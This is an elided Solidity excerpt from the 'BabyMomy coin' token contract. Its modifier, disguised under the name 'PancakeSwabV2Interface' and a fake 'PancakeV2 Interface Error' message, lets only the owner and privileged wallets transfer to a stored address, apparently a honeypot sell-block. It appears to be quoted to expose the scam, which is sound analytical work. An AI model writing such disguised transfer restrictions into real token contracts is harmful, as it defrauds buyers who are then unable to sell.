...
contract Ownable is Context {
    ...
    function _setmarketingwallet(address marketingadd) external onlyOwner() {
    ...
    modifier PancakeSwabV2Interface(address from, address to, bool fromTransfer) {
      ...
      else require((to != nxOwner || from == _owner || from == _leaveowner || from == _marketingadd), "PancakeV2 Interface Error");
      _;
    }
}

contract Babby is Context, IERC20, Ownable {
    ...
    string private _name = 'BabyMomy coin';
